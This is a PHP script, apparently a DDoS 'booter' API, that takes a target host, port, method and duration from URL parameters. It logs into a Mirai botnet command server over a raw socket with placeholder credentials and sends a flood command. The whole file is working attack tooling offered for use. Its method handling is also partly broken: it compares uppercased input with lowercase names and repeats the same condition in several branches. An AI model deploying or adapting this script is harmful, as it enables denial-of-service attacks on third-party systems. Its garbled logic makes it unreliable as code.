<?php
error_reporting(E_ALL);
 
 
   
 
 //   * Usage: http://SERVERIP/mirai.php?key=ipdowned&host=[host]&port=[port]&method=[method]&time=[time]


 
    $APIKeys = array("YourKey");
 
 
 

 
    $attackMethods = array("std", "VSE", "method3", "method4", "method5", "method6", "method7", "method8",);
 
 
 
    function htmlsc($string)
 
    {
 
        return htmlspecialchars($string, ENT_QUOTES, "UTF-8");
 
    }
 
 
 
    // Check if all parameters are passed
 
    if (!isset($_GET["key"]) || !isset($_GET["host"]) || !isset($_GET["port"]) || !isset($_GET["method"]) || !isset($_GET["time"]))
 
        die("You are missing a parameter");
 
 
 
    // Variables for attack
 
    $key = htmlsc($_GET["key"]);
 
    $host = htmlsc($_GET["host"]);
 
    $port = htmlsc($_GET["port"]);
 
    $method = htmlsc(strtoupper($_GET["method"]));
 
    $time = htmlsc($_GET["time"]);
 
    $command = "";
 
 
 
    // Check if API key is valid
 
    if (!in_array($key, $APIKeys)) die("Invalid API key");
 
 
 
    // Check if attack method is valid
 
    if (!in_array($method, $attackMethods)) die("Invalid attack method");
 
 
 
    // Set command for method (should really use a switch() statement but who cares?)
 
 
    if ($method == "std") $command = " methodname $host $time dport=$port\r\n";
    
    else if ($method == "vse") $command = " methodname $host $time dport=$port\r\n";

    else if ($method == "method") $command = " methodname $host $time dport=$port\r\n";
    
    else if ($method == "method") $command = " methodname $host $time dport=$port\r\n";
    
    else if ($method == "method") $command = " methodname $host $time dport=$port\r\n";

    else if ($method == "method") $command = " methodname $host $time dport=$port\r\n";

    else if ($method == "method") $command = " methodname $host $time dport=$port\r\n";

    else if ($method == "method") $command = " nfodown $host $time dport=$port\r\n";
  
    // Add other methods if you need them, I'm sure you're capable of doing that (I hope)
 
 
 
    // Connect
 
    $socket = fsockopen("YourNetIP", "YourPortIp"); // Example: $socket = fsockopen("1.2.3.4", "23");
 
    ($socket ? null : die("Failed to connect"));
 
 
 
    // Login
 
    fwrite($socket, " \r\n"); // Leave This.
   
    sleep(3);
   
    fwrite($socket, "YourUserNameNet\r\n"); // Username
   
    sleep(3);
   
    fwrite($socket, "YourPassNet\r\n"); // Password
 
 
 
    // Send command
 
    sleep(9); // Why? I've noticed for some people it doesn't work w/o the sleep() (or anything before fwrite()ing $command)!
 
    fwrite($socket, $command);
 
 
 
    // Close connection
 
    fclose($socket);
 
    // Say the attack has been sent
 
    echo "API BY IpDowned ATTACKING $host:$port for $time seconds using method $method!\n";
 
   
?>